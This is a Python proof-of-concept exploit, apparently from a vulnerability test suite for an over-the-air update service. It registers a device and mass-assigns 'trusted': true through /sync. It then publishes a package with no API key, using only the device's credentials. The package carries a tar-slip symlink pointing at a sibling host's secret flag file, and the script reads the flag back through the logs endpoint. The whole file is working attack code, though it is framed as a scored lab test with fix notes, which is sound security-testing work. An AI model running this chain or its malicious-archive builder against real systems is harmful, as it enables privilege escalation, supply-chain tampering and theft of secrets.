#!/usr/bin/env python3
"""
PoC #7: Unsafe object-binding deserialization (mass assignment) on /sync
-------------------------------------------------------------------------
handleDeviceSync() (handlers.go) decodes the request body directly onto the
live *Device record fetched from the store (`json.NewDecoder(r.Body).Decode(d)`)
instead of through a narrow DTO like handleDeviceReport() uses. Every exported,
JSON-tagged field on Device is therefore settable by whoever holds a valid
device token - including `trusted`, which is never meant to be client-settable:
checkPublishAuth() (auth.go) accepts a Trusted device's own credentials as an
alternative to the static X-OTA-Api-Key on /publish.

Scoreable impact: this registers an ordinary device, mass-assigns
"trusted": true on its own record via /sync (a field never in the documented
API), and then publishes using nothing but that device's ID and token - no
X-OTA-Api-Key at all. The published package carries a tar-slip SYMLINK
(../logs/<name> -> ../secret/flag.txt) that, once log's ota-agent.sh extracts
it, points into the sibling's served logs/ at its secret file; we read the flag
back through GET /logs/{name}. So the trust escalation is an independent,
key-free route to the SAME fleet-member secret #2/#4 reach.

Fixing #2 (rotating the default key) does nothing here; this path has to be
fixed independently (decode /sync through an allowlisted DTO). It cashes out
through #3's tar-slip symlink sink (post_install stays "none"), so that the
three unauthenticated-publish routes (#2/#7/#9) are split across the two
delivery sinks and no single server-side sink fix in publish.go flips all three
at once (see vuln_tests/README.md).

Run against the docker-compose fleet:
  docker compose -f vuln_tests/docker-compose.yml run --build --rm poc \
      python3 07_mass_assignment_trust_escalation.py ota 8090
"""
import hashlib
import io
import json
import os
import re
import sys
import tarfile
import time
import urllib.error
import urllib.request
import uuid

OTA_HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
OTA_PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8090
OTA_BASE = f"http://{OTA_HOST}:{OTA_PORT}"
LOG_HOST = os.environ.get("LOG_HOST", "log")
LOG_PORT = int(os.environ.get("LOG_PORT", "8080"))
LOG_BASE = f"http://{LOG_HOST}:{LOG_PORT}"
EXPECTED_FLAG = os.environ.get("LOG_FLAG_VALUE", "")
FLAG_RE = re.compile(r"FLAG\{[^}]{1,256}\}")


def post_json(path, body, headers=None):
    req = urllib.request.Request(f"{OTA_BASE}{path}", data=json.dumps(body).encode(), method="POST")
    req.add_header("Content-Type", "application/json")
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read())


def make_targz_with_symlink(files, link_name, link_target):
    """A .tar.gz whose entries include a SYMLINK (link_name -> link_target).
    An uncontained extractall() restores it with no filter, so a link_name that
    escapes the extraction dir plants an attacker-chosen symlink."""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for name, content in files:
            info = tarfile.TarInfo(name=name)
            info.size = len(content)
            tf.addfile(info, io.BytesIO(content))
        link = tarfile.TarInfo(name=link_name)
        link.type = tarfile.SYMTYPE
        link.linkname = link_target
        tf.addfile(link)
    return buf.getvalue()


def multipart(fields, filename, file_bytes):
    boundary = "----otaPoC" + uuid.uuid4().hex
    body = b""
    for name, value in fields.items():
        body += (f"--{boundary}\r\nContent-Disposition: form-data; "
                  f'name="{name}"\r\n\r\n{value}\r\n').encode()
    body += (f"--{boundary}\r\nContent-Disposition: form-data; "
              f'name="package"; filename="{filename}"\r\n'
              "Content-Type: application/gzip\r\n\r\n").encode()
    body += file_bytes + b"\r\n"
    body += f"--{boundary}--\r\n".encode()
    return boundary, body


def main():
    token = uuid.uuid4().hex[:12]
    link_name = f"massassign_{token}"

    print("[*] Registering an ordinary device for module 'log'")
    status, dev = post_json("/devices/register", {"module": "log"})
    if status != 201:
        print(f"[-] Registration failed: {status} {dev}")
        return 1
    device_id, dev_token = dev["id"], dev["token"]
    print(f"[*] Registered {device_id}")

    print("[*] Calling /sync with an undocumented 'trusted' field")
    status, synced = post_json(f"/devices/{device_id}/sync", {"status": "ok", "trusted": True},
                                {"Authorization": f"Bearer {dev_token}"})
    print(f"[*] /sync -> {status} {synced}")
    if status != 200 or not synced.get("trusted"):
        print("[-] /sync did not report trusted=true (mass assignment fixed?)")
        return 1

    # Tar-slip SYMLINK cash-out (post_install stays "none", a valid enum, so the
    # #4 post_install fix does NOT reject this): it extracts out of .ota-tmp via
    # "../logs/<name>" and points at the sibling secret "../secret/flag.txt".
    package = make_targz_with_symlink(
        files=[("README.txt", b"routine log-module maintenance update\n")],
        link_name=f"../logs/{link_name}",
        link_target="../secret/flag.txt",
    )
    sha = hashlib.sha256(package).hexdigest()
    version = f"1.0.0-massassign-{token[:6]}"
    manifest = {"module": "log", "version": version, "sha256": sha, "post_install": "none"}

    boundary, body = multipart({"manifest": json.dumps(manifest)}, "pkg.tar.gz", package)
    req = urllib.request.Request(f"{OTA_BASE}/publish", data=body, method="POST")
    req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
    req.add_header("X-OTA-Device-Id", device_id)
    req.add_header("X-OTA-Device-Token", dev_token)
    print(f"[*] Publishing with ONLY device credentials ({device_id}) - no X-OTA-Api-Key at all")
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            print(f"[*] /publish -> {r.status}")
    except urllib.error.HTTPError as e:
        print(f"[*] /publish -> {e.code} {e.read().decode(errors='replace')[:200]}")
        print("[-] Publish with device credentials was rejected (trust escalation fixed, "
              "or the shared tar-slip sink is validated).")
        return 1

    print("[*] Waiting for log-module's agent to poll, download, and extract...")
    deadline = time.time() + 60
    got = None
    while time.time() < deadline:
        try:
            with urllib.request.urlopen(f"{LOG_BASE}/logs/{link_name}", timeout=5) as r:
                text = r.read().decode(errors="replace")
            # Empty until the symlink is planted; once it is, GET follows it to
            # the secret file and returns the flag.
            if FLAG_RE.search(text):
                got = text
                break
        except (urllib.error.HTTPError, urllib.error.URLError, ConnectionError):
            pass
        time.sleep(3)

    if got is None:
        print("[-] Timed out: no FLAG{...} came back through the planted symlink via /logs/{name}")
        return 1

    m = FLAG_RE.search(got)
    if not m:
        print("[-] Package was applied, but no FLAG{...} was exfiltrated from secret/flag.txt")
        return 1
    flag = m.group(0)

    if EXPECTED_FLAG and flag != EXPECTED_FLAG:
        print(f"[-] Exfiltrated {flag!r} but expected {EXPECTED_FLAG!r} - value mismatch.")
        return 1
    print("[+] SCORED: mass-assigning 'trusted' via /sync let an ordinary device publish with no "
          "API key, and the fleet member applied that package, exfiltrating the log host's minted "
          f"per-deployment secret {flag!r}.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
